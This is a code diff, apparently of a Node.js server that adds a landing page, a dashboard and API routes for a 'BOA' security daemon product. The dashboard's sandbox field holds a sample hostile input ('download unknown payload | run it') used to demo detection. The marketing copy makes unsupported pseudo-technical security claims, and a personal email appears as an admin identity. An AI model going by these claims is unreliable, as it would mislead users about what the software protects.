0;background:linear-gradient(135deg,var(--glow),var(--cyan));color:#00130c;font-weight:900;text-transform:uppercase}.ghost{background:transparent!important;color:var(--glow)!important;border:1px solid var(--line)!important}ul{padding-left:1.1rem}@media(max-width:880px){.hero,.grid{grid-template-columns:1fr}main{padding:18px}}</style></head><body><main><section class="hero"><div class="hero-copy"><p class="kicker">BOA Terminal Serpent</p><h1>The translator between your apps and the system.</h1><p class="muted">BOA Core is the local trust gateway. It wraps authorized communication into opaque envelopes, unwraps trusted BOA traffic, and keeps running after the website closes.</p><p><span class="badge">BOA Core</span><span class="badge">BOA Dashboard</span><span class="badge">BOA Network</span></p><a class="button" href="/dashboard">Open BOA Dashboard</a><a class="button ghost" href="/dashboard#connect">Connect This Device</a><a class="button ghost" href="/aletheia">Aletheia Bridge</a></div><div class="card"><h2>Product model</h2><ul><li>The daemon is the active protection layer.</li><li>The website manages licenses, pairing, settings, and status.</li><li>Trusted BOA clones share identity through handshake.</li><li>Intercepted BOA-routed files look like gibberish envelopes.</li></ul></div></section><section class="grid"><div class="card"><h2>Authorized trust gateway</h2><p class="muted">BOA manages all channels the OS and user authorize. VPN/firewall integrations can expand coverage later.</p></div><div class="card"><h2>Password language</h2><p class="muted">Passwords shape the communication language between trusted BOA instances, not just login.</p></div><div class="card"><h2>License clones</h2><p class="muted">Daemon security stays free; paid plans charge by connected device so a license can clone trusted BOA instances to approved devices.</p></div></section></main></body></html>`;
+  }
+
   dashboardHtml() {
+
     return `<!doctype html>
 <html lang="en">
 <head>
@@ -495,30 +989,92 @@ main().catch((error) => {
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>BOA Dashboard</title>
 <style>
-body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;background:#08110d;color:#e8fff2;margin:0;padding:2rem}main{max-width:980px;margin:auto}.card{background:#102119;border:1px solid #1f6f46;border-radius:16px;padding:1rem;margin:1rem 0}input,select,button{font:inherit;padding:.7rem;border-radius:10px;border:1px solid #2d8b59;margin:.25rem;background:#07130d;color:#e8fff2}button{cursor:pointer;background:#00a862;border-color:#00ff88;color:#001b0f;font-weight:700}pre{white-space:pre-wrap;background:#030806;padding:1rem;border-radius:12px}</style>
+:root{color-scheme:dark;--bg:#030507;--panel:rgba(8,18,28,.78);--line:rgba(71,255,176,.28);--glow:#47ffb0;--cyan:#62d9ff;--text:#ecfff8;--muted:#94b8ad;--warn:#ffcf6b}*{box-sizing:border-box}body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif;background:radial-gradient(circle at 15% 0%,rgba(71,255,176,.18),transparent 32%),radial-gradient(circle at 85% 10%,rgba(98,217,255,.16),transparent 30%),linear-gradient(135deg,#020304,#07131b 55%,#030806);color:var(--text);margin:0;min-height:100vh}main{max-width:1180px;margin:auto;padding:32px}.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:center;min-height:420px}.card,.hero-copy,.terminal{background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:22px;box-shadow:0 0 60px rgba(71,255,176,.08),inset 0 1px rgba(255,255,255,.08);backdrop-filter:blur(14px)}h1{font-size:clamp(2.4rem,7vw,5.7rem);line-height:.9;margin:0 0 18px;letter-spacing:-.08em}.kicker{color:var(--glow);text-transform:uppercase;letter-spacing:.22em;font-weight:800}.muted{color:var(--muted)}.grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.stack{display:grid;gap:16px}.terminal{min-height:320px}.pulse{display:inline-flex;gap:8px;align-items:center}.pulse:before{content:"";width:10px;height:10px;border-radius:50%;background:var(--glow);box-shadow:0 0 20px var(--glow);animation:p 1.3s infinite}@keyframes p{50%{opacity:.35}}input,select,textarea,button{width:100%;font:inherit;padding:.82rem;border-radius:14px;border:1px solid rgba(98,217,255,.3);margin:.32rem 0;background:#061018;color:var(--text)}textarea{min-height:96px}label{display:flex;align-items:center;gap:.55rem;color:var(--muted);margin:.45rem 0}input[type=checkbox]{width:auto;accent-color:var(--glow)}button{cursor:pointer;background:linear-gradient(135deg,var(--glow),var(--cyan));border:0;color:#00130c;font-weight:900;text-transform:uppercase;letter-spacing:.04em}.ghost{background:transparent;color:var(--glow);border:1px solid var(--line)}pre{white-space:pre-wrap;overflow:auto;background:#020506;border:1px solid rgba(255,255,255,.08);padding:1rem;border-radius:16px;max-height:420px}.badge{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:.35rem .7rem;color:var(--glow);margin:.18rem}.danger{color:var(--warn)}@media(max-width:880px){.hero,.grid{grid-template-columns:1fr}main{padding:18px}}
+</style>
 </head>
 <body>
 <main>
-<h1>BOA Dashboard</h1>
-<p>Create an account, download your personalized daemon, manage devices, cast frames, tasks, and plan access from this site.</p>
-<section class="card"><h2>Create account</h2><label>Username <input id="su-user" autocomplete="username"></label><label>Password <input id="su-pass" type="password" autocomplete="new-password"></label><label>Plan <select id="su-plan"><option>solo</option><option>team</option><option>enterprise</option></select></label><button onclick="signup()">Create + Download Daemon</button></section>
-<section class="card"><h2>Login</h2><label>Username <input id="li-user" autocomplete="username"></label><label>Password <input id="li-pass" type="password" autocomplete="current-password"></label><button onclick="login()">Login</button></section>
-<section class="card"><h2>Plan</h2><label>Plan <select id="plan"><option>solo</option><option>team</option><option>enterprise</option></select></label><button onclick="purchasePlan()">Activate Plan</button></section>
-<section class="card"><h2>Workspace</h2><label>Task title <input id="task-title"></label><button onclick="addTask()">Add Task</button></section>
-<section class="card"><h2>Dashboard Data</h2><button onclick="refresh()">Refresh</button><button onclick="downloadDaemon()">Download Daemon</button><pre id="out"></pre></section>
+<section class="hero">
+  <div class="hero-copy">
+    <p class="kicker">BOA Terminal Serpent</p>
+    <h1>BOA Core is the gate. This is the control panel.</h1>
+    <p class="muted">BOA is a local-first dashboard and daemon MVP for password-derived language isolation, device heartbeats, signed intent translation, six-variable casting, and phase-stack storage demonstrations.</p>
+    <p><span class="badge">Free security tier</span><span class="badge">Daemon sign-on</span><span class="badge">AWS-ready Node app</span></p>
+    <button onclick="runSandbox()">Run malware-injection sandbox</button>
+    <button class="ghost" onclick="probeDaemon()">Detect local daemon</button>
+    <button class="ghost" onclick="downloadInstaller('auto')">Connect This Device</button>
+    <button class="ghost" onclick="loadAletheia()">Open Aletheia bridge</button>
+    <button class="ghost" onclick="buildCyberApp()">Reverse-solve cyber app</button>
+    <button class="ghost" onclick="showUnifiedWorkspace()">Show unified workspace</button>
+  </div>
+  <div class="terminal"><div class="pulse">BOA protection status</div><pre id="out">BOA gate offline. Start daemon or download connector.</pre></div>
+</section>
+<section class="grid">
+  <div class="card"><h2>Create account</h2><input id="su-user" autocomplete="username" placeholder="username"><input id="su-pass" type="password" autocomplete="new-password" placeholder="password"><select id="su-plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="signup()">Create account</button><p class="muted">No commands required. After signup, click Connect This Device and BOA handles pairing from the dashboard.</p></div>
+  <div class="card"><h2>Existing user / new device</h2><input id="li-user" autocomplete="username" placeholder="username"><input id="li-pass" type="password" autocomplete="current-password" placeholder="password"><button onclick="login()">Login dashboard</button><button class="ghost" onclick="downloadInstaller('auto')">Connect This Device</button></div>
+  <div class="card"><h2>Admin identity</h2><p class="muted">Admin usernames recognized for demos: <b>boydchandler030@gmail.com</b> or <b>Xquisite6a6y</b>. Secrets are never hard-coded; use the account password you create.</p><select id="plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="purchasePlan()">Activate demo plan</button><button class="ghost" onclick="checkoutPlan()">Upgrade with Stripe</button></div>
+</section>
+<section class="grid">
+  <div class="card"><h2>Sandbox test</h2><p class="muted">Try a suspicious download, a risky app action, or a normal request. BOA normalizes safe intent and quarantines hostile patterns as inert envelopes.</p><textarea id="sandbox-input">download unknown payload | run it</textarea><select id="sandbox-target"><option>linux</option><option>windows</option><option>boa</option></select><button onclick="runSandbox()">Test BOA envelope</button></div>
+  <div class="card"><h2>Phase lattice simulator</h2><p class="muted">Test the geometric idea safely: correct language recovers the vector, wrong language becomes garbage, and reuse estimates simulated compression.</p><input id="phase-devices" type="number" min="1" value="5" placeholder="devices"><button onclick="runPhaseLattice()">Run phase lattice demo</button><p class="muted" id="phase-summary">Simulation ready.</p></div><div class="card"><h2>Per-device pricing</h2><p class="muted" id="pricing-summary">Daemon security is free. Paid plans charge for connected devices.</p><input id="pricing-devices" type="number" min="1" value="5"><button onclick="quotePricing()">Quote devices</button></div>
+  <div class="card"><h2>3D phase stack</h2><p class="muted" id="stack-summary">Store data at a coordinate, follow equation depth, and bring the exact payload forward.</p><textarea id="stack-payload">Phase-stacked demo file</textarea><button onclick="runPhaseStack()">Store and bring forward</button></div>
+  <div class="card"><h2>Connected devices</h2><p class="muted" id="device-summary">Waiting for daemon</p><button class="ghost" onclick="refresh()">Refresh dashboard</button></div>
+  <div class="card"><h2>Pairing</h2><p class="muted" id="pairing-code">Click to create a pairing code for the local gate.</p><button onclick="startPairing()">Show pairing code</button></div>
+  <div class="card"><h2>Send signal</h2><textarea id="signal-message">Hello from BOA</textarea><button onclick="sendSignal()">Send through BOA</button><p class="badge" id="signal-badge">Waiting for signal</p></div>
+  <div class="card"><h2>Received signals</h2><p class="muted" id="received-summary">No signals received yet.</p><button class="ghost" onclick="receiveDemo()">Receive demo signal</button></div>
+  <div class="card"><h2>Automation controls</h2><p class="muted">BOA defaults to automatic protection, resource sharing, intent translation, casting, and phase-stack memory. Turn off anything you do not want.</p><label><input id="auto-resourceSharing" type="checkbox" checked> Resource sharing</label><label><input id="auto-intentTranslation" type="checkbox" checked> Intent translation</label><label><input id="auto-casting" type="checkbox" checked> Device casting</label><label><input id="auto-phaseStackMemory" type="checkbox" checked> Phase-stack memory</label><label><input id="auto-daemonAutostart" type="checkbox" checked> Daemon autostart</label><button onclick="saveAutomation()">Save automation settings</button></div>
+  <div class="card"><h2>BOA architecture</h2><p class="muted" id="architecture-summary">Core daemon, dashboard control panel, and BOA Network envelopes are active.</p><button class="ghost" onclick="loadBackendStatus()">Show backend components</button></div><div class="card" id="connect"><h2>Device connector</h2><p class="muted">Choose your device. BOA downloads the correct connector and pairs it to this dashboard.</p><button onclick="downloadInstaller('auto')">Connect This Device</button><button class="ghost" onclick="downloadInstaller('windows')">Windows</button><button class="ghost" onclick="downloadInstaller('macos')">macOS</button><button class="ghost" onclick="downloadInstaller('linux')">Linux</button></div>
+</section>
 </main>
 <script>
 let sessionToken = localStorage.getItem('boaSession') || '';
 async function api(path, body) { const res = await fetch(path, { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body || {}) }); const data = await res.json(); if(!res.ok) throw new Error(data.error); return data; }
-function show(value){ document.getElementById('out').textContent = JSON.stringify(value,null,2); }
+function show(value){
+  const out = document.getElementById('out');
+  if(!value || typeof value !== 'object'){ out.textContent = String(value || ''); return; }
+  if(value.mode === 'boa-phase-stack-demo-v1'){ document.getElementById('stack-summary').textContent = 'Coordinate (' + value.stored.coordinate.x + ',' + value.stored.coordinate.y + ',' + value.stored.coordinate.z + ') depth ' + value.stored.depth + '; match: ' + value.matches + '; efficiency ' + value.snapshot.unifiedEfficiency.efficiencyMultiplier + 'x.'; out.textContent = 'BOA isolated the 3D coordinate, followed the equation path, and brought the payload forward.'; return; }
+  if(value.mode === 'boa-phase-lattice-simulation-v1'){ document.getElementById('phase-summary').textContent = 'Correct key MSE ' + value.recovery.correctKeyMse + '; wrong key MSE ' + value.recovery.wrongKeyMse + '; simulated compression ' + value.compression.compressionFactor + 'x.'; out.textContent = value.safetyNote; return; }
+  if(value.model === 'free-security-per-device-connectivity'){ document.getElementById('pricing-summary').textContent = value.devices + ' device(s): $' + value.monthlyUsd + '/month or $' + value.annualUsd + '/year. Security stays free.'; out.textContent = value.explanation; return; }
+  if(value.verdict){ out.textContent = 'Sandbox result: ' + value.verdict + '\nSafety: ' + value.safetyNote + '\nCast demo: six-variable intent frame prepared without running the input.'; return; }
+  if(value.daemonDetected === false){ out.textContent = 'BOA gate offline. Start daemon or download connector.'; return; }
+  if(value.daemonDetected === true){ out.textContent = 'Local BOA daemon detected and ready.'; return; }
+  if(value.account && value.sessionToken){ out.textContent = 'Account ready. Your personalized installer is downloading now. Open it once, then manage BOA from this dashboard.'; return; }
+  if(value.account && value.automation){ out.textContent = 'Automation settings saved. You can change these toggles anytime.'; return; }
+  if(value.devices){ updateDashboardPanels(value); out.textContent = 'Dashboard refreshed. ' + value.devices.length + ' device(s). BOA signal layer is ready.'; return; }
+  if(value.message){ out.textContent = value.message; return; }
+  if(value.status){ out.textContent = value.status; return; }
+  if(value.error){ out.textContent = 'Action needed: ' + value.error; return; }
+  out.textContent = 'BOA action complete.';
+}
 async function signup(){ const data = await api('/api/signup', { username: val('su-user'), password: val('su-pass'), plan: val('su-plan') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); location.href=data.downloadUrl; }
-async function login(){ const data = await api('/api/login', { username: val('li-user'), password: val('li-pass') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); }
+async function login(){ const data = await api('/api/login', { username: val('li-user'), password: val('li-pass') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); await refresh(); }
 async function purchasePlan(){ show(await api('/api/plan', { sessionToken, plan: val('plan') })); }
+async function checkoutPlan(){ const data = await api('/api/stripe/checkout', { sessionToken, plan: val('plan') }); if(data.checkoutUrl){ location.href = data.checkoutUrl; return; } show(data); }
 async function addTask(){ show(await api('/api/workspace/task', { sessionToken, title: val('task-title') })); }
-async function refresh(){ const res = await fetch('/api/dashboard?session=' + encodeURIComponent(sessionToken)); show(await res.json()); }
-function downloadDaemon(){ location.href='/download/boa-daemon.js?session=' + encodeURIComponent(sessionToken); }
+async function refresh(){ const res = await fetch('/api/dashboard?session=' + encodeURIComponent(sessionToken)); const data = await res.json(); applyAutomation(data.account && data.account.automation); show(data); }
+async function runSandbox(){ show(await api('/api/sandbox', { input: val('sandbox-input'), target: val('sandbox-target') })); }
+async function probeDaemon(){ try{ const res = await fetch('http://127.0.0.1:8788/status', { mode:'cors' }); show({daemonDetected:true, status: await res.json()}); } catch(error) { show({daemonDetected:false, nextStep:'Create or login, then click Connect This Device. BOA keeps running after the page closes.', detail:error.message}); } }
+
+async function startPairing(){ const data = await api('/api/pair/start', { sessionToken, deviceName: detectPlatform() }); document.getElementById('pairing-code').textContent = 'Pairing code: ' + data.code + ' | QR text: ' + data.qrText; show({ message:'Pairing code ready' }); }
+async function sendSignal(){ const data = await api('/api/boa/send', { sessionToken, message: val('signal-message') }); document.getElementById('signal-badge').textContent = data.status; show(data); }
+async function receiveDemo(){ const wrapped = await api('/api/boa/wrap', { sessionToken, message: 'Demo received signal' }); const received = await api('/api/boa/receive', { sessionToken, envelope: wrapped.envelope }); document.getElementById('received-summary').textContent = received.status + ': ' + received.payload; show(received); }
+function updateDashboardPanels(data){ if(data.architecture){ document.getElementById('architecture-summary').textContent = data.architecture.core + ' ' + data.architecture.claim; } const devices=data.devices||[]; document.getElementById('device-summary').textContent = devices.length ? devices.map(d => (d.label || d.id) + ': ' + (d.status || 'offline') + ', heartbeat ' + (d.lastSeenAt || 'waiting') + ', CPU ' + (d.cpus || 'n/a') + ', BOA ' + (d.signalStatus || 'waiting')).join(' | ') : 'Waiting for daemon'; const latest=(data.signals||[])[0]; document.getElementById('received-summary').textContent = latest ? latest.status + ' at ' + latest.createdAt : 'No signals received yet.'; }
+
+function downloadDaemon(){ if(!sessionToken) return show({error:'Login or create an account first.'}); location.href='/download/boa-daemon.js?session=' + encodeURIComponent(sessionToken); }
+function detectPlatform(){ const p=(navigator.platform||navigator.userAgent||'').toLowerCase(); if(p.includes('win')) return 'windows'; if(p.includes('mac')) return 'macos'; if(p.includes('linux')) return 'linux'; return 'auto'; }
+function downloadInstaller(platform){ if(!sessionToken) return show({error:'Login or create an account first.'}); const selected = !platform || platform === 'auto' ? detectPlatform() : platform; location.href='/download/installer?platform=' + encodeURIComponent(selected) + '&session=' + encodeURIComponent(sessionToken); }
+function automationSettings(){ return ['daemonAutostart','resourceSharing','intentTranslation','casting','phaseStackMemory'].reduce((out,key)=>{ const el=document.getElementById('auto-' + key); out[key]=el ? el.checked : true; return out; }, {}); }
+function applyAutomation(settings){ if(!settings) return; Object.entries(settings).forEach(([key,value])=>{ const el=document.getElementById('auto-' + key); if(el) el.checked = !!value; }); }
+async function runPhaseLattice(){ show(await api('/api/phase-lattice', { devices: Number(val('phase-devices') || 5), size: 128, steps: 90 })); }
+async function runPhaseStack(){ show(await api('/api/phase-stack/demo', { devices: Number(val('phase-devices') || 5), payload: { fileName:'dashboard-demo.txt', body: val('stack-payload') } })); }
+async function quotePricing(){ show(await api('/api/pricing/quote', { devices: Number(val('pricing-devices') || 1) })); }
+async function saveAutomation(){ show(await api('/api/automation', { sessionToken, settings: automationSettings() })); }
+async function loadBackendStatus(){ const res = await fetch('/health'); const data = await res.json(); document.getElementById('architecture-summary').textContent = (data.backendComponents||[]).map(c => c.name + ': ' + c.routes.join(', ')).join(' | '); show({ status:'Backend components loaded' }); }
+async function loadAletheia(){ const data = await api('/api/aletheia/reverse-solve', { target:'BOA and Aletheia operating as one product system' }); show(data); }
+async function buildCyberApp(){ const data = await api('/api/aletheia/cyber-app', { target:'Aletheia builds the most advanced honest BOA cybersecurity app' }); show(data); }
+async function showUnifiedWorkspace(){ const res = await fetch('/api/aletheia/unified'); show(await res.json()); }
 function val(id){ return document.getElementById(id).value; }
-if(sessionToken) refresh().catch((error)=>show({error:error.message}));
+if(sessionToken) refresh().catch((error)=>show({error:error.message})); else probeDaemon();
 </script>
 </body>
 </html>`;
@@ -528,17 +1084,76 @@ if(sessionToken) refresh().catch((error)=>show({error:error.message}));
     try {
       const url = new URL(request.url, this.baseUrl);
       if (request.method === 'GET' && url.pathname === '/') {
+        sendText(response, 200, this.landingHtml(), 'text/html; charset=utf-8');
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/app') {
+        if (!staticFileResponse(response, 'app.html')) sendText(response, 200, this.dashboardHtml(), 'text/html; charset=utf-8');
+        return;
+      }
+      if (request.method === 'GET' && url.pathname.startsWith('/assets/')) {
+        if (!staticFileResponse(response, url.pathname)) sendJson(response, 404, { error: 'Asset not found.' });
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/dashboard') {
         sendText(response, 200, this.dashboardHtml(), 'text/html; charset=utf-8');
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/aletheia') {
+        sendText(response, 200, this.aletheiaHtml(), 'text/html; charset=utf-8');
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/health') {
+        sendJson(response, 200, {
+          status: 'ok',
+          service: 'boa-terminal-serpent',
+          timestamp: new Date().toISOString(),
+          architecture: this.architectureSummary(),
+          backendComponents: this.backendComponents(),
+          deploymentDecision: this.deploymentDecision(),
+          staticUi: fs.existsSync(path.join(STATIC_ROOT, 'app.html')),
+          stripeConfigured: Boolean(process.env.STRIPE_SECRET_KEY),
+        });
         return;
       }
       if (request.method === 'GET' && url.pathname === '/api/dashboard') {
         sendJson(response, 200, this.dashboardData(url.searchParams.get('session')));
         return;
       }
+      if (request.method === 'GET' && url.pathname === '/api/public-config') {
+        sendJson(response, 200, this.publicConfig());
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/api/deployment/audit') {
+        sendJson(response, 200, { ok: true, deploymentDecision: this.deploymentDecision(), backendComponents: this.backendComponents(), staticRoot: STATIC_ROOT });
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/api/aletheia/status') {
+        sendJson(response, 200, this.aletheiaStatus());
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/api/aletheia/unified') {
+        sendJson(response, 200, this.aletheiaUnifiedStatus());
+        return;
+      }
       if (request.method === 'GET' && url.pathname === '/download/boa-daemon.js') {
         const source = this.downloadDaemon(url.searchParams.get('session'));
         sendText(response, 200, source, 'application/javascript; charset=utf-8', {
           'content-disposition': 'attachment; filename="boa-daemon.js"',
+        });
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/download/installer') {
+        const installer = this.installerScript(url.searchParams.get('session'), url.searchParams.get('platform'));
+        sendText(response, 200, installer.body, installer.contentType, {
+          'content-disposition': `attachment; filename="${installer.filename}"`,
+        });
+        return;
+      }
+      if (request.method === 'GET' && url.pathname === '/download/daemon') {
+        const installer = this.installerScript(url.searchParams.get('session'), url.searchParams.get('platform'));
+        sendText(response, 200, installer.body, installer.contentType, {
+          'content-disposition': `attachment; filename="${installer.filename}"`,
         });
         return;
       }
@@ -561,7 +1176,23 @@ if(sessionToken) refresh().catch((error)=>show({error:error.message}));
       const body = await readJsonBody(request);
       if (url.pathname === '/api/signup') sendJson(response, 201, this.createAccount(body));
       else if (url.pathname === '/api/login') sendJson(response, 200, this.login(body));
+      else if (url.pathname === '/api/pair/start') sendJson(response, 201, this.startPairing(body.sessionToken, body));
+      else if (url.pathname === '/api/pair/complete') sendJson(response, 200, this.completePairing(body));
       else if (url.pathname === '/api/plan') sendJson(response, 200, this.purchasePlan(body.sessionToken, body.plan));
+      else if (url.pathname === '/api/stripe/checkout') sendJson(response, 200, await this.createStripeCheckout(body.sessionToken, body.plan));
+      else if (url.pathname === '/api/stripe/webhook') sendJson(response, 200, this.recordStripeWebhook(body));
+      else if (url.pathname === '/api/automation') sendJson(response, 200, this.updateAutomation(body.sessionToken, body.settings || {}));
+      else if (url.pathname === '/api/boa/wrap') sendJson(response, 200, this.wrapSignal(body.sessionToken, body));
+      else if (url.pathname === '/api/boa/unwrap') sendJson(response, 200, this.unwrapSignal(body.sessionToken, body));
+      else if (url.pathname === '/api/boa/send') sendJson(response, 200, this.sendSignal(body.sessionToken, body));
+      else if (url.pathname === '/api/boa/receive') sendJson(response, 200, this.receiveSignal(body.sessionToken, body));
+      else if (url.pathname === '/api/sandbox') sendJson(response, 200, this.sandboxDemo(body));
+      else if (url.pathname === '/api/phase-lattice') sendJson(response, 200, this.phaseLatticeDemo(body));
+      else if (url.pathname === '/api/phase-stack/demo') sendJson(response, 200, this.phaseStackDemo(body));
+      else if (url.pathname === '/api/pricing/quote') sendJson(response, 200, this.pricingQuote(body));
+      else if (url.pathname === '/api/aletheia/reverse-solve') sendJson(response, 200, this.aletheiaReverseSolve(body));
+      else if (url.pathname === '/api/aletheia/cyber-app') sendJson(response, 200, this.aletheiaCyberApp(body));
+      else if (url.pathname === '/api/aletheia/unify') sendJson(response, 200, this.aletheiaFullUnification(body));
       else if (url.pathname === '/api/workspace/task') sendJson(response, 201, this.addTask(body.sessionToken, body.title, body.details || {}));
       else if (url.pathname === '/api/workspace/complete') sendJson(response, 200, this.completeTask(body.sessionToken, body.taskId, body.result || {}));
       else if (url.pathname === '/api/daemon/issue') sendJson(response, 201, this.issueDaemonForSession(body.sessionToken, body));
